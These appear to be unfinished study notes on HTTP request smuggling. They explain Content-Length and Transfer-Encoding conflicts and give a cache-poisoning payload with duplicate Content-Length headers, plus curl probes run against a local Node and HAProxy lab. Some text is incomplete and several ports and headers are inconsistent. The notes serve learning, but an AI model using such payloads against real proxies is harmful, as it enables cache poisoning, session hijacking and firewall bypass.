## HTTP Smuggling
Is an exploit that can be preformed when there are proxies in front of
services (load balancer/reverse proxy), like is often the case in cloud
environments and normal deployments to distribute load.

The idea is that a user sends a request to the proxy and the proxy will
send requests to the backend servers. Each connetion to the loadbalancer/reverse
proxy will be a separate connection as the clients can be from anywhere, but the
connection from the loadbalancer/proxy can use a single connection to the
backend server and send multiple requests over that connection.

The server needs to be able to find out where one request starts and the next
request begins.

Enables various attacks like web cache poisoning, session hijacking, cross-site
scripting, the ability to bypass web application firewall protection.
The procedure is to send multiple specially constructed requests that cause
two entities to se two different sets of requests, allowing the attacker to
smuggle a request to one device without the other device knowing about it.
In the case of cache poining 

### Content-Length
This header specifies the total size of the request body in bytes.

### Transfer-Encoding: chunked
This header specifies that the request body will be sent in chunks separated
by newline characters. Each chunk is proceeded with the size of that following
chunk.
The request body ends when there is a 0-lenght chunk.

If we send both a Content-Length and Transfer-Encoding, what would happen?


This mostly about size and Content-Length headers. Let say we have a POST
request and we set two Content-Length headers. 
```
Content-Length: 0\r\n
Content-Length: 28\r\n
\r\n
GET /poison.html HTTP/1.1\r\n
Host: SITE\r\n
Bla: 
GET http://SITE/page_to_poison.html HTTP/1.1\r\n
Host: SITE\r\n
Connection: Keep-Alive\r\n
\r\n 
```
Depending on the server what will which value of Content-Length will it use?

```
HTTP/1.1 keep-alive

+------+       +-----------+   HTTP over TLS/TCP      +----------+
|Client| ----->| Front-end | ------------------------>| Back-end |
+------+       +-----------+                          +----------+
```
The HTTP request are send one after the other on the came connection to the
backend servers. The servers have to parse the headers to determine where one
request begins and finishes.


### Smuggling Example
First we have to start our backend server:
```console
$ env NODE_DEBUG=http,net node chunked-server.js
```
Our backend server is listening to port 7777 and debug is useful to see
if packets are reaching the backend or not.

Next, we start or frontend proxy. I'm using HAProxy 2.0.5 which should be
vulnerable to Content-Length Transfer-Encoding headers.
```console
$ ./haproxy-2.0.5/haproxy -f haproxy.conf
```
Then we should be able to send requests to the address of the proxy server, 
which is configured to listen to port 8888.
```console
$ curl -v -H "Content-Length: 5" --data "bajja" http://localhost:8889
```
Using wireshark we can use a filter like `tcp port 7777 and tcp port 8888` to
inspect the traffic an see that our backend server is hit.

Now, lets send a request with contains two Content-Length headers with different
sizes:
```console
$ curl -v -H "Content-Length: 5" -H "Content-Length: 6" --data "bajja" http://localhost:8888
```
The log in the backend server will be:
```console
NET 1799436: onconnection
NET 1799436: _read
NET 1799436: Socket._handle.readStart
HTTP 1799436: SERVER new http connection
(node:1799436) Warning: Setting the NODE_DEBUG environment variable to 'http' can expose sensitive data (such as passwords, tokens and authentication headers) in the resulting log.
HTTP 1799436: SERVER socketOnParserExecute NaN
HTTP 1799436: parse error [Error: Parse Error: Duplicate Content-Length] {
  bytesParsed: 112,
  code: 'HPE_UNEXPECTED_CONTENT_LENGTH',
  reason: 'Duplicate Content-Length',
  rawPacket: <Buffer 50 4f 53 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 6c 6f 63 61 6c 68 6f 73 74 3a 38 38 38 38 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a ... 122 more bytes>
}
NET 1799436: destroy
NET 1799436: close
NET 1799436: close handle
NET 1799436: has server
NET 1799436: SERVER _emitCloseIfDrained
NET 1799436: SERVER handle? true   connections? 0
NET 1799436: emit close
HTTP 1799436: server socket close
```
So it does not look like node is vulnerable to duplicated Content-Length
headers.

So, how about if we use a Content-Header and a Transfer-Encoding, how will these
servers handle that.
```console
$ curl -v -H "Content-Length: 6" -H "Transfer-Encoding: chunked" --data "\r\n0\r\nG" http://localhost:7777
```

Notice that this request is sent to the frontend.

```console
$ curl -H "Accept: application/html" -H "Content-Length: application/xml" --data "body" -X POST http://localhost:7777
$ curl -H "Accept: application/html" -H "Content-Length: application/xml" -X GET http://localhost:7777
```

```console
$ node chunked-server.js
```
And start wireshark and use `tcp port 7777` as the filter and `*Loopback:lo`
as the network interface (nic).
Then run the following curl command:
```console
$ curl -v -H "Content-Length: 0" -H "Transfer-Encoding: chunked" --data "\r\n0\r\nNEW" http://localhost:7777
```
What I'm interested in is the what the body of this request looks like:


Lets take a look at a simple post to understand how data is sent over the
wire:
```console
$ curl -v -H "Content-Length: 5" --data "bajja" http://localhost:7777
```
And in wireshark this would look like:
```
POST / HTTP/1.1 
Host: localhost:7777 
User-Agent: curl/7.66.0 
Accept: */* 
Content-Length: 5 
Content-Type: application/x-www-form-urlencoded
bajja
```
What the server really sees is:
```
POST / HTTP/1.1\r\nHost: localhost:7777\r\nUser-Agent: curl/7.66.0\r\nAccept: */*\r\nContent-Length: 5\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n
```


```console
$ curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 4" --data "\r\n1\r\nZ\r\n\Q\r\n" http://localhost:7777
```
